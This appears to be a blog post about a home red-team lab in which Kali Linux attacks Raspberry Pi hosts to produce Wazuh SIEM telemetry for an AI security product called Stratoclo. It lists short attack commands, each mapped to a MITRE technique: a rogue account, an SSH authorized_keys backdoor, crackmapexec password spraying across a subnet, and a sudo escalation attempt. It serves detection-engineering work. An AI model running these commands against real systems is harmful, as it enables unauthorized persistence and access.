---
layout: with_mermaid
title: "RED TEAM LAB : Stratoclo"
author: "Stratoclo"
---

# Building a Real Red-Team Lab with Kali + Wazuh + Raspberry Pi


![Stratoclo Red Team Lab Architecture]({{ site.baseurl }}/assets/images/2025-12-20/arch.png)

*Figure 1 – End-to-end adversary simulation pipeline. Real attacks originate from Kali Linux, compromise Raspberry Pi victims, are ingested by Wazuh SIEM, and reasoned by Stratoclo’s AI engine for explainable detection and response.*

---

## Why I Built This Lab



Modern SOC tools are trained on paper attacks.  
Stratoclo is trained on real adversary behavior.

This lab produces real intrusion telemetry and allows Stratoclo to:

- Generate real Linux attack logs  
- Validate Wazuh detection rules  
- Feed real signals into Stratoclo’s AI reasoning engine  
- Design detections based on real attacker behavior  

---

## My Physical SOC Lab Architecture

| Role     | Machine                                                    |
| :------- | :--------------------------------------------------------- |
| Attacker | Kali Linux (UTM VM on Mac)                                 |
| SIEM     | Wazuh Manager + Indexer + Dashboard (Ubuntu 24 LTS Server) |
| Victims  | Raspberry Pi 5 + Raspberry Pi 3                            |
| Dev      | macOS                                                      |

---

## Machines in the Lab

### Kali Linux (Attacker)
![Kali Linux attacker workstation]({{ site.baseurl }}/assets/images/2025-12-20/kali.jpg)

*Figure 2 – Kali Linux attacker VM used to launch persistence, credential abuse, and escalation attacks.*


### Wazuh (Agents)
![Wazuh agents dashboard]({{ site.baseurl }}/assets/images/2025-12-20/wazuh-agents.jpg)

*Figure 3 – Wazuh SIEM showing live Raspberry Pi agents streaming telemetry.*

### Active Attack
![Password spraying execution]({{ site.baseurl }}/assets/images/2025-12-20/kali-terminal.jpg)

*Figure 4 – Password spraying: one password tested across multiple accounts.*

### Wazuh Detection
![Wazuh password spraying detection]({{ site.baseurl }}/assets/images/2025-12-20/wazuh-alerts.jpg)

*Figure 5 – Wazuh detecting correlated SSH authentication failures.*

### Stratoclo AI Report
![Stratoclo AI incident report]({{ site.baseurl }}/assets/images/2025-12-20/stratoclo-report.jpg)

*Figure 6 – Stratoclo AI auto-investigation and remediation guidance.*

---

## Attacks Implemented

### 1. Rogue User Implant (Persistence)
```bash
sudo useradd -m fileserver
sudo passwd fileserver
```
MITRE: T1136 – Create Account

### 2. SSH Key Backdoor (Persistence)
```bash
echo "<attacker_public_key>" >> ~/.ssh/authorized_keys
```
MITRE: T1098 – Account Manipulation

### 3. Password Spraying
```bash
crackmapexec ssh 192.168.0.0/24 -u users.txt -p "Winter2024!"
```
MITRE: T1110.003 – Password Spraying

### 4. Privilege Escalation Attempt
```bash
sudo -i
```
MITRE: T1068 – Privilege Escalation

---

## Why This Lab Matters

This lab generates real SOC telemetry — not replayed logs.  
Stratoclo’s AI is trained on live adversary behavior.

Stratoclo can:

- Learn attacker patterns  
- Auto-classify incidents  
- Generate investigation summaries  
- Propose remediation  
- Prioritize risks  

---

## From SIEM to AI SOC

Traditional SOC = Dashboards + Alerts  
**Stratoclo SOC = Reasoning + Explanation + Action**

This is how real cybersecurity platforms are born.
